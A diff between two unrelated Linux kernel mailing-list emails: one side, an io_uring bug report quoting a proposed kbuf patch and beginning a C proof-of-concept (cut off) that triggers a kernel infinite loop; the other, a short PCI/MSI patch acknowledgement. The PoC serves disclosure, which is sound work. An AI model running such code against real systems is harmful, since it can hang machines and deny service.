@@ -1,203 +1,183 @@
-Return-Path: <linux-kernel+bounces-789102-lists+linux-kernel=lfdr.de@vger.kernel.org>
+Return-Path: <linux-kernel+bounces-789103-lists+linux-kernel=lfdr.de@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
-Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
-	by mail.lfdr.de (Postfix) with ESMTPS id 89CB1B39128
-	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 03:38:45 +0200 (CEST)
+Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
+	by mail.lfdr.de (Postfix) with ESMTPS id 75E3EB3912A
+	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 03:38:58 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by am.mirrors.kernel.org (Postfix) with ESMTPS id 7F3C21C217EF
-	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 01:39:05 +0000 (UTC)
+	by am.mirrors.kernel.org (Postfix) with ESMTPS id 3AEC71C219FF
+	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 01:39:18 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 92EDA212B0A;
-	Thu, 28 Aug 2025 01:37:13 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id CC935189F3B;
+	Thu, 28 Aug 2025 01:37:43 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="t9bCdBOf"
-Received: from out203-205-221-236.mail.qq.com (out203-205-221-236.mail.qq.com [203.205.221.236])
+	dkim=pass (2048-bit key) header.d=nxp.com header.i=@nxp.com header.b="aWdgj5p/"
+Received: from DU2PR03CU002.outbound.protection.outlook.com (mail-northeuropeazon11011027.outbound.protection.outlook.com [52.101.65.27])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 89C4221773D;
-	Thu, 28 Aug 2025 01:37:08 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.236
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1756345032; cv=none; b=elb7JqUVtrIjyqN5qVRRZgtDsNYNE++6rNxRe+hLEmpVJ/lV0nmGjbFjd9vH/c6yyOc6BIDP2xY3YoS4JOho89q1tpztYfaXoxCoFXhwdhF2SdHUTGi86Vp5XDnsBheXfXGriYB8ad6Z19sxQGaJZip2eTR10/jorrqhbabg+W8=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1756345032; c=relaxed/simple;
-	bh=4HrtJyCgz5outgZsrWreunen6H5khAGfYNYvkKjkRV0=;
-	h=Message-ID:From:To:Cc:Subject:Date:In-Reply-To:References:
-	 MIME-Version; b=DbesPPmXbSuyO1OcHI5CjZEtiIw1cKzj/Kx8vtL9UUzvyS8QUF6PrXKpZIUDLhpc3rAkJ37yEKdWdP2myIisjgXscRk1jTXa0b+JaSFD3KJJ/eXyVwQ/bT6tSP/y+b1h5beB/O7dpqTW+PMb+yEb95HnqfYgTp+LflJss1eVZhs=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=t9bCdBOf; arc=none smtp.client-ip=203.205.221.236
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1756345021; bh=/sr+eSuAYU3WbwRQK33VHOQJ6d8mU+6xKUUv6PfTlaM=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=t9bCdBOfS2rs68fVrFlyf3ArlBmybw2LSKarIxlurf3oAM3LFY+UqUb6sThEQXPys
-	 RzEa6XTR5LQipN02rnBDj+3Yd6jz7e6pcnVr/heHvkY6wnOlIirr6Sp3VnK7ozPT8M
-	 j5fUi2fHul0LsX4uxRrGKLX550LamBC95FW/V6zo=
-Received: from nebula-bj.localdomain ([223.104.40.195])
-	by newxmesmtplogicsvrszb42-0.qq.com (NewEsmtp) with SMTP
-	id 93ABE854; Thu, 28 Aug 2025 09:36:58 +0800
-X-QQ-mid: xmsmtpt1756345018t2irkinp4
-Message-ID: <tencent_2DEFFED135071FB225305A65D1688B303A09@qq.com>
-X-QQ-XMAILINFO: MllZffuBkEb5Szf0QZGBMmOVO0N411OCOvRYQBqGmUAd+7N/epmnsE9IC5Mbzh
-	 O3WKNeUY8LoL6LNqJSSY0cVW1ubeTnRVD8WL64RayKq5PJ4fZVRW+psZYNl1EaCQsr/x9VolDjm2
-	 3XhCdqsNmY28UDqNiyYYXzwf1m41A8LiMFElZV8BOxsfxpYsQ0jlVjWzkcBAcF7Y1tQ++QckvbAR
-	 gIvs5qdZKwMLYYK6BKKg8twkYQR+8TmrTS3FtXD3SRVWvOXd06PIN6ZaU40ODWXpEw1JDJDRY8K8
-	 6wRCkMFSJtpc1lbL+IsEAzBy/GjVeVDb3BHiGdfgzanKHbuC+eMfG8mO85jENAjWv0E+7WNnsxAn
-	 xKmbmqC1mzi1naMP/dinYR19ODvnn+FUA+d96F5iBxwY0X9RaKoKumBkdoD3JDiQ+LybExbjizvu
-	 WGTZibQNMnrTgxOHWyOPB1UH9dd8wx0SDr0ffWXnZYGEBPAJbn8NzFGtsXragJUGryMglRvCys76
-	 3LmknweCydn+KZ5RdoYaxEg1w1zvi00mz9Ne5jO2nHhZnmNhh9LQRc1Yjjreuj2MLohLryWRJYbu
-	 1GmqOasRS31Uf7BFwUFksA6q2I7cF9DthNa18CycsDTDkp6pesmj8a+kGQYoar06oscoYgR8T35V
-	 9sNEbZM8xpY4o2M8G4IBNaaXoQLOe3hkxLyKULto65eZZl6h/InAeJQ8QsYYNt2l1zBAbmAP9jH3
-	 JKaC4yz4/0k0bgqVZxJQpAqVro3Hxai9iIvP4xEMZzdEiPGd4eNv71VM7MObTaCFTWrWN1aQCxIp
-	 j+saWvZcSdlhWiPclI0AHDQO+ag5BBurXJgKNjQMPBzDf0sqW4e+X9tWFOAXqsou7/PVy8NpUtr3
-	 5gIGRDJkOA7H0X9cMQ7gzPUcAkO2pEguoU0ufu6nPbK1vs1gQB8RFNHzLUPqG5g3gyWgg3kWA/Vy
-	 lPMNBryuKSYr4dgMC1GEi7k5GU0bwpBZY+AAzj3qfkQwIOi+BMAWW/v8/fOYe6O/4qZDBvSYi4UW
-	 dPT8pE8T2xnekm62KIgvnLiAy3c4KMKGPqKGkcMROG1KMgJZADtjTky0V+HTG9AbmBRljWVQ==
-X-QQ-XMRINFO: OD9hHCdaPRBwq3WW+NvGbIU=
-From: Qingyue Zhang <chunzhennn@qq.com>
-To: axboe@kernel.dk
-Cc: aftern00n@qq.com,
-	chunzhennn@qq.com,
-	io-uring@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: Re: [PATCH 2/2] io_uring/kbuf: fix infinite loop in io_kbuf_inc_commit()
-Date: Thu, 28 Aug 2025 09:36:58 +0800
-X-OQ-MSGID: <20250828013658.29061-1-chunzhennn@qq.com>
-X-Mailer: git-send-email 2.48.1
-In-Reply-To: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
-References: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 609CA21CA02;
+	Thu, 28 Aug 2025 01:37:40 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.65.27
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1756345062; cv=fail; b=UWyxej/DRd0EsyVJF46bG+XXgiQBgmFdNfIkE9IBiCk9tJRJQyzUQCBAay6d/EUprK8cs0xcx4wPupFIN0AjAJsfrx+WuF2LkfUKB5uDEPRs80UwNmToxXQpDL5N3zVsvVRvtqJ3eFVjryGlLIuLVKCCevRFDK7zra+X4+wlSCg=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1756345062; c=relaxed/simple;
+	bh=fdC9WPmPdizVrKZbdDKHS8UmWTRD4hTjIQeIZ6Ad8vo=;
+	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
+	 Content-Type:MIME-Version; b=WjIbU+cWjeFnFIqg8Zei1J+cOz3nnMUMqqWH4ACVNhXiBnimgAfi92eiNM+0R7gFxbwRgygii3QZ+m163yEd37XKDfu/dXkepC+87LQBjs9c6yKAzajbERbkqVN1yQMLbUTIlL19wvMxEQ7Y/TQw1LG8Dt1ODJG4l7ZlwBwyJDo=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=nxp.com; spf=pass smtp.mailfrom=nxp.com; dkim=pass (2048-bit key) header.d=nxp.com header.i=@nxp.com header.b=aWdgj5p/; arc=fail smtp.client-ip=52.101.65.27
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=nxp.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nxp.com
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=OYcHKgeo2LxolgIvdY3o55nAiZJtyZoXSFkWXnchF5Pa25GS+1D4lZLi2YYbVFqzu+d+9aJ095ImKI1gG/HGYN0BndJmrogBD2WON180VBFBWQtMP5TPM8k5kiLJgPZ1tCUGUgLFAYGhw0RPTF40dzqsdg3J2vg88jzvGw7INGXY1QNKcOpRtcj8XypauYCXmwIA3ta+a5JbVd89Y/WGLAujAHArhaE0F76lOVc5+qmEoHodB3uIb2G/6Z1Qik8akL2kdPPVmIWpzTgXuUsQcdGyMJQWV4m3XhJFabYeiIKXjx8ebprpWdapYem/hSfuDGwmfuhrjFDedLBayo9iaw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=fdC9WPmPdizVrKZbdDKHS8UmWTRD4hTjIQeIZ6Ad8vo=;
+ b=TzINfznm6uKHs6Up2Ucw7Pu8D/CvNOvv5QrUjqxHOoKrw8koEbGzoMOpL5LbhgZ7HnQJUa8SKBmT4OWTTKXtxcxohxf2gp+J3d/NfAT8uCA3QWNNkwxAYHrXO6rgC0UYUDApyoznQaIPPQon8IQb/dXUL2kR6lcHliYP4qb9i0/DYnOquMoz7eD62xL1yxEq7vcdpSsnESmL4HNqdRfEvDl+k2aUQuL5h+rl7o16fij5nAlw6Xe0QOKqMui49HA3TmB+BF7M9ioy7LkiJ0T0IUuJvAjsNZqz/6OdZ5ryKl0H5GMsW9dpiWnjrXyaA7MYneHZwRv2utTiroVMnqn59g==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=nxp.com; dmarc=pass action=none header.from=nxp.com; dkim=pass
+ header.d=nxp.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nxp.com; s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=fdC9WPmPdizVrKZbdDKHS8UmWTRD4hTjIQeIZ6Ad8vo=;
+ b=aWdgj5p/n7j8PJ1nNWQ2pj0rxCJLyR6YSgPLOkDZMZrbT59R1WSrVqm2WtovqbS8TeG1jSEfV33ENTB9GWs9Rr8Yfsme4Q89ICOy01nyZf+jI/wS7GCNUM2HdNmwIKi9F5zNkyGPSdaIC05Ex7NzyFMuZL9SxdA6poXYHN1+nM6SKh2cdD/ZuRNAou/Rl6QJ+tblTfUShqQea2R7LTT2nMtVgrLuyQAgDuIY6PtZwY9cJvCb3aG31rxidmfIe0vE09aj/Phs4ZUZz56BRd4gs8nwJbA4LjvKMauvD8G4kJJnvH4v7RZTLfhw+WJLv5RxJhbH8gM1uwxPH9SqQ4BZuQ==
+Received: from PAXPR04MB8510.eurprd04.prod.outlook.com (2603:10a6:102:211::7)
+ by AS1PR04MB9360.eurprd04.prod.outlook.com (2603:10a6:20b:4da::9) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9073.11; Thu, 28 Aug
+ 2025 01:37:37 +0000
+Received: from PAXPR04MB8510.eurprd04.prod.outlook.com
+ ([fe80::a7c2:e2fa:8e04:40db]) by PAXPR04MB8510.eurprd04.prod.outlook.com
+ ([fe80::a7c2:e2fa:8e04:40db%5]) with mapi id 15.20.9073.010; Thu, 28 Aug 2025
+ 01:37:36 +0000
+From: Wei Fang <wei.fang@nxp.com>
+To: Inochi Amaoto <inochiama@gmail.com>
+CC: "linux-pci@vger.kernel.org" <linux-pci@vger.kernel.org>,
+	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, Yixun Lan
+	<dlan@gentoo.org>, Longbin Li <looong.bin@gmail.com>, Linux Kernel Functional
+ Testing <lkft@linaro.org>, Nathan Chancellor <nathan@kernel.org>, Jon Hunter
+	<jonathanh@nvidia.com>, Bjorn Helgaas <bhelgaas@google.com>, Thomas Gleixner
+	<tglx@linutronix.de>, Marc Zyngier <maz@kernel.org>, Lorenzo Pieralisi
+	<lpieralisi@kernel.org>, Shradha Gupta <shradhagupta@linux.microsoft.com>,
+	Chen Wang <unicorn_wang@outlook.com>
+Subject: RE: [PATCH v2] PCI/MSI: Check MSI_FLAG_PCI_MSI_MASK_PARENT in
+ cond_[startup|shutdown]_parent()
+Thread-Topic: [PATCH v2] PCI/MSI: Check MSI_FLAG_PCI_MSI_MASK_PARENT in
+ cond_[startup|shutdown]_parent()
+Thread-Index: AQHcF6fXkpXyvyKXE0mDMm4Q7Jv/O7R3SNQA
+Date: Thu, 28 Aug 2025 01:37:36 +0000
+Message-ID:
+ <PAXPR04MB8510DDAA3226A19CC52D4C88883BA@PAXPR04MB8510.eurprd04.prod.outlook.com>
+References: <20250827230943.17829-1-inochiama@gmail.com>
+In-Reply-To: <20250827230943.17829-1-inochiama@gmail.com>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+authentication-results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=nxp.com;
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: PAXPR04MB8510:EE_|AS1PR04MB9360:EE_
+x-ms-office365-filtering-correlation-id: 76a55e69-e9ff-4ed3-1e29-08dde5d377e4
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam:
+ BCL:0;ARA:13230040|366016|1800799024|19092799006|376014|7416014|38070700018;
+x-microsoft-antispam-message-info:
+ =?us-ascii?Q?RF7SFEek+bVXZrgjLrkzt5EVc/qOMeo2wDu4c94KI6zaxrKVDCKW3q0JzHXN?=
+ =?us-ascii?Q?4hjKi5RoNJlTV7rriqhQ/6FY5/Y8bLW9Ln5BFxeZHussPjsbdU3uLR3YX633?=
+ =?us-ascii?Q?hlm2+DUhsN+JyGy5sACcuyjDG7Ex49gbs0Zpunm4COB9FHun7LW4busAFIJF?=
+ =?us-ascii?Q?H8HyEYwy2BxaV09rL4zS1dUbHndsNfPqNWQzi5RO+A8dUOQiRG4HwRD0i3e4?=
+ =?us-ascii?Q?8UqadQILzR/Ff6i+LPa6sYfxlhb1EbOp+CbXlI7rgPCdYJ2sAeJXENF9LGp+?=
+ =?us-ascii?Q?SONiP4M3VHZKXyWnZAkIxsbxkA7U+g275XHe2zw4kleDAZanv2Rgh6OLw0OU?=
+ =?us-ascii?Q?4ZFlGYS1a3dtlFtSiPtKGEhY3XuUmhflpMbOcKu3R8A9/OBIz2hrqO4nL6nO?=
+ =?us-ascii?Q?prRTM4gOyZbpT4LU+4YhDmRNhJAgPUkGtVEp3LDHhLOS5AXN0xAfSnQpwuF/?=
+ =?us-ascii?Q?goOvT2op6AbgOVtHLRwge/AE081I5VGFqAXDb4TBH3zd+t/dAinL0Ae5b3uL?=
+ =?us-ascii?Q?WfprDucoxz7Pje7MvwVagHyn7CXxoqcJZ1sZwMh4N08E3fitlEpaDcyFy1KJ?=
+ =?us-ascii?Q?+q6uR1Ne5unGqG/ATtFlEyE2PYvGHZ/FYDzNef22yqjIV5onZjUi4wjwuBXv?=
+ =?us-ascii?Q?M55IHE57oNndLk5O8SbRqWFsgopzF8CZMtVnFGJd6T7D7/OhGTkeSOdMO6wo?=
+ =?us-ascii?Q?HiuHBuUwb4mqb5W601uZ21Gm+6Ll7+up65a8HNIw+XUuWzq8biNQJdoQt2vw?=
+ =?us-ascii?Q?68Zv2DyaY9tndbZ8iAp2YodubYHLBwOiyO2/YXegUo9+K9945kGCHBmtDFUw?=
+ =?us-ascii?Q?qD60fsT5OPZ2mQfR6TxgI2SRxqWU7bhOuNo/pjt7JDgWdV0XWbcD+JT3LFGs?=
+ =?us-ascii?Q?V51plky8+nm75zfXs0yOInkApDVUoeadrRv/LoS9SaHA8uyzVKlTpZ6ll980?=
+ =?us-ascii?Q?+TO9jPNJupHzJ+MC8sIMf7xF/DJOanzNiCOJqQt24kWREzB6iXFD+kHd8LgG?=
+ =?us-ascii?Q?xi59mdXP9AtHTTs8mKpNRwh2j8k3TMcfIJpadbcaKgTt29nNwWv/txzVoqYN?=
+ =?us-ascii?Q?svqrvUTHkOivCUHbSrriHS0Q5mIss1ceIcj3xkiZLfcT9ekjd4GmIbVXXV+U?=
+ =?us-ascii?Q?PcY76ZDfNuldpv932umEWAJBoDbKhp4Pr9SzL2icCFnplh9mvDAirFpKVnq6?=
+ =?us-ascii?Q?cj4J9UuylNmaA+suaKYS5M1vhkdfvoh21wUy+oMhAEZzmWC5bpQzR89495nL?=
+ =?us-ascii?Q?at3aRCaPTRZmx/eYkkoquw9ej3APFSy0sUu+7/SFt6tAIIGBC/iCanCGL8wD?=
+ =?us-ascii?Q?H5oVWhSTlZ5P5+PfAJmAG59T+csG97fVnu9yTbz6x6vaDgqRO08sgTcDTUDy?=
+ =?us-ascii?Q?xugorAVuriiyXeitsPn0HVDjtXEW1q8bT7g2eG7z/Be+Nafa46rLSWyW+sN3?=
+ =?us-ascii?Q?d03sCojScH6H85TC2ctG2/ylLP3goTxxlnwFvpHdLXaHFniJJPUwUw=3D=3D?=
+x-forefront-antispam-report:
+ CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PAXPR04MB8510.eurprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(1800799024)(19092799006)(376014)(7416014)(38070700018);DIR:OUT;SFP:1101;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ =?us-ascii?Q?bkBsiB2i1BAl+GJLzjrZJIsPwP2H1j1RiUbj1NnOlc7vhVh6P0K64gzv9Uv2?=
+ =?us-ascii?Q?Zj6mPpv/VAO/v0ILRAUlrwzZF8reXOTgprdo5Pm1RQDlOXTdN3MwXNS00cLj?=
+ =?us-ascii?Q?cVYSRK+JJJsbnAINeJDTRptZVAOkFzbHuKaY/JcGJzI/sWxpWcEAfIZY6giI?=
+ =?us-ascii?Q?YXpGwO0m03fOQE+G8IhtuSqs/R+2DuMPLil93LjKW/Z7/fpivp9Dryq+Wrjb?=
+ =?us-ascii?Q?BnpVszxVGmJ+XmfAqhJWYllAnlGnv1FVauvYMnSF53mk4Sv+IV9qru+Hvpep?=
+ =?us-ascii?Q?cdfNaV3eMCA9lHyvI1FeL+Qjpn7L+xUxa46cMT4RheFkuHVVZWtPzEHTJq52?=
+ =?us-ascii?Q?HyAK493H1mVQhzEVCcDghGACz/LTdViXGOD0LG3iAjNrzED6MN4qrnyIsVkG?=
+ =?us-ascii?Q?mc/JZR2+z/ZpEK2yd4gAwYzgclSmiJTq2VuLBBj7ZhEnUi3OF3Jb7DJshFPd?=
+ =?us-ascii?Q?LC2dbk96PoCcNJxBdp8JYBpjdzM0IDkPIKYpKMXdAULM4BL5R7svqINwdsra?=
+ =?us-ascii?Q?radbGY1uFvb9fvtcUDZRmMFsjj8tojWOBm21QYH1e6TbG5ZXFFudc+nOdH2P?=
+ =?us-ascii?Q?DIw9rrCjp22+VFQuAmG9Nkyq+wO3hJG2eLZrEBs3rc/5phD6pMmzABUH1w5J?=
+ =?us-ascii?Q?w1QenHr0RrcfvtIfk3xZk3aUFozRqSxTjqfmFS1PcE+oAcP20ivpOG5LVK7y?=
+ =?us-ascii?Q?R2B0W6QaRs9ZrVfKM4z5W2SS82Xn6SWmaHqyzX3Eodn7GRGF9C5Bm2Q7EFcp?=
+ =?us-ascii?Q?bZXpQ99Bu0LUb1RNNU1h3J54D6P+J72LCjyaPYRFR/NvqO3tDkuT21KYINv3?=
+ =?us-ascii?Q?a53QUpnOAIt6+l9Qew9divkhQFay64E7I4yoBuQVWMZWATRqKv/4Q2nMv2jc?=
+ =?us-ascii?Q?yH22Tpf7jg5uwt+F5AqijbKT59Hs5UAz0MiWfZa1YGYyogwj47ST9hOyij8+?=
+ =?us-ascii?Q?K7XU0ftgQv/a/rVj5r39IQf/tatQZ4T6DgDcx5WJfbGXKbUindC/6Yt3hVWy?=
+ =?us-ascii?Q?xvKgaIhnj4+3rFmelIWt3x7MmUNIEvFwoeyytcU0WgcirNuLNlck9TkVSYhY?=
+ =?us-ascii?Q?8+jtteS9h5GG9oJpM7qk9owm4zx+Kec8EVEX53EDHeG7+aSE6myHpr8oaZmE?=
+ =?us-ascii?Q?C0dVPqRANw+n0t2AP7iZCRkckNzDwudQLTVXerydMCevrrXgjwz+Hq0LJRqO?=
+ =?us-ascii?Q?Wt+8BqYIvN4hHETeylN5DxNcdSwpOM04XH+2aK4j8P+XUzo4fqBj53wUbL+L?=
+ =?us-ascii?Q?hqHwFhoWnzR9hjYt/yeqgkVvosgXBZwuAd0u6xa+JCJYfxXK59K3fn24Rczw?=
+ =?us-ascii?Q?IxdyKoTCQifwKEwU2fv0iNwFoE+Gk0Y+E/1PBhw6HQ/mJWcnYucCHO8V6Odf?=
+ =?us-ascii?Q?uvayen5DAxQ8oqQSx7NLkUI1O1wYW1ze82BavfYkj5V92nn7AzvfoqK0yBD5?=
+ =?us-ascii?Q?YkTHy6cZGYmOkk6srYbjpUbLa3uEcR0lBQwFVAj46QbVqBcvcvN3L4yNl0C8?=
+ =?us-ascii?Q?vR5iG8lgoIqD/VVQLZVQRhznQW2BGlt33nLZ9EJcODWi+Tk1DphC3FN91rN1?=
+ =?us-ascii?Q?mVqo67CwcyuRuAwtEkY=3D?=
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+X-OriginatorOrg: nxp.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: PAXPR04MB8510.eurprd04.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 76a55e69-e9ff-4ed3-1e29-08dde5d377e4
+X-MS-Exchange-CrossTenant-originalarrivaltime: 28 Aug 2025 01:37:36.8339
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 686ea1d3-bc2b-4c6f-a92c-d99c5c301635
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: 3X9seYiz8DClDyTHeZKFJKEXjd90D90xGz32C1ManxM319KDQgbPlcTWUTrh1+SfsBJRaIEBTWwvW844D2zVfw==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: AS1PR04MB9360
 
-On 2025-08-27 21:45 UTC, Jens Axboe wrote:
-> I took a closer look and there's another spot where we should be
-> using READ_ONCE() to get the buffer length. How about something like
-> the below rather than the loop work-around?
-> 
-> 
-> commit 7f472373b2855087ae2df9dc6a923f3016a1ed21
-> Author: Jens Axboe <axboe@kernel.dk>
-> Date:   Wed Aug 27 15:27:30 2025 -0600
-> 
->     io_uring/kbuf: always use READ_ONCE() to read ring provided buffer lengths
->     
->     Since the buffers are mapped from userspace, it is prudent to use
->     READ_ONCE() to read the value into a local variable, and use that for
->     any other actions taken. Having a stable read of the buffer length
->     avoids worrying about it changing after checking, or being read multiple
->     times.
->     
->     Fixes: c7fb19428d67 ("io_uring: add support for ring mapped supplied buffers")
->     Link: https://lore.kernel.org/io-uring/tencent_000C02641F6250C856D0C26228DE29A3D30A@qq.com/
->     Reported-by: Qingyue Zhang <chunzhennn@qq.com>
->     Signed-off-by: Jens Axboe <axboe@kernel.dk>
-> 
-> diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c
-> index 81a13338dfab..394037d3f2f6 100644
-> --- a/io_uring/kbuf.c
-> +++ b/io_uring/kbuf.c
-> @@ -36,15 +36,18 @@ static bool io_kbuf_inc_commit(struct io_buffer_list *bl, int len)
->  {
->  	while (len) {
->  		struct io_uring_buf *buf;
-> -		u32 this_len;
-> +		u32 buf_len, this_len;
->  
->  		buf = io_ring_head_to_buf(bl->buf_ring, bl->head, bl->mask);
-> -		this_len = min_t(u32, len, buf->len);
-> -		buf->len -= this_len;
-> -		if (buf->len) {
-> +		buf_len = READ_ONCE(buf->len);
-> +		this_len = min_t(u32, len, buf_len);
-> +		buf_len -= this_len;
-> +		if (buf_len) {
->  			buf->addr += this_len;
-> +			buf->len = buf_len;
->  			return false;
->  		}
-> +		buf->len = 0;
->  		bl->head++;
->  		len -= this_len;
->  	}
-> @@ -159,6 +162,7 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
->  	__u16 tail, head = bl->head;
->  	struct io_uring_buf *buf;
->  	void __user *ret;
-> +	u32 buf_len;
->  
->  	tail = smp_load_acquire(&br->tail);
->  	if (unlikely(tail == head))
-> @@ -168,8 +172,9 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
->  		req->flags |= REQ_F_BL_EMPTY;
->  
->  	buf = io_ring_head_to_buf(br, head, bl->mask);
-> -	if (*len == 0 || *len > buf->len)
-> -		*len = buf->len;
-> +	buf_len = READ_ONCE(buf->len);
-> +	if (*len == 0 || *len > buf_len)
-> +		*len = buf_len;
->  	req->flags |= REQ_F_BUFFER_RING | REQ_F_BUFFERS_COMMIT;
->  	req->buf_list = bl;
->  	req->buf_index = buf->bid;
-> @@ -265,7 +270,7 @@ static int io_ring_buffers_peek(struct io_kiocb *req, struct buf_sel_arg *arg,
->  
->  	req->buf_index = buf->bid;
->  	do {
-> -		u32 len = buf->len;
-> +		u32 len = READ_ONCE(buf->len);
->  
->  		/* truncate end piece, if needed, for non partial buffers */
->  		if (len > arg->max_len) {
+> For msi controller that only supports MSI_FLAG_PCI_MSI_MASK_PARENT,
+> the newly added callback irq_startup() and irq_shutdown() for
+> pci_msi[x]_template will not unmask/mask the interrupt when startup/
+> shutdown the interrupt. This will prevent the interrupt from being
+> enabled/disabled normally.
+>=20
+> Add the missing check for MSI_FLAG_PCI_MSI_MASK_PARENT in the
+> cond_[startup|shutdown]_parent(). So the interrupt can be normally
+> unmasked/masked if it does not support MSI_FLAG_PCI_MSI_MASK_PARENT.
+>=20
+> Fixes: 54f45a30c0d0 ("PCI/MSI: Add startup/shutdown for per device
+> domains")
 
-I'm afraid this doesn't solve the problem. the value of buf->len
-could be changed before the function is called. Maybe we shouldn't
-trust it at all?
+Thanks for fixing this issue.
 
-Here is a PoC that can still trigger infinite loop:
-
-#include<liburing.h>
-#include<liburing/io_uring.h>
-#include<netinet/in.h>
-#include<stdint.h>
-#include<sys/socket.h>
-#include<arpa/inet.h>
-#include<stdlib.h>
-int main(){
-    struct io_uring ring;
-    struct io_uring_buf* buf_info;
-
-    posix_memalign((void**)&buf_info, 4096, 4096);
-    char* buf = malloc(0x1000);
-    struct io_uring_buf_reg reg = {
-        .ring_addr = (uint64_t)buf_info,
-        .ring_entries = 2
-    };
-    buf_info[0].addr = (uint64_t)buf_info;
-    buf_info[0].len = 0x1000;
-    buf_info[0].bid = 0;
-    buf_info[0].resv = 1; // tail
-    io_uring_queue_init(0x10, &ring, IORING_SETUP_NO_SQARRAY);
-    io_uring_register_buf_ring(&ring, &reg, IOU_PBUF_RING_INC);
-
-    int fds[2];
-    socketpair(AF_UNIX, SOCK_DGRAM, 0, fds);
-    void* send_buf = calloc(1, 32);
-    send(fds[0], send_buf, 32, MSG_DONTWAIT);
-
-    struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
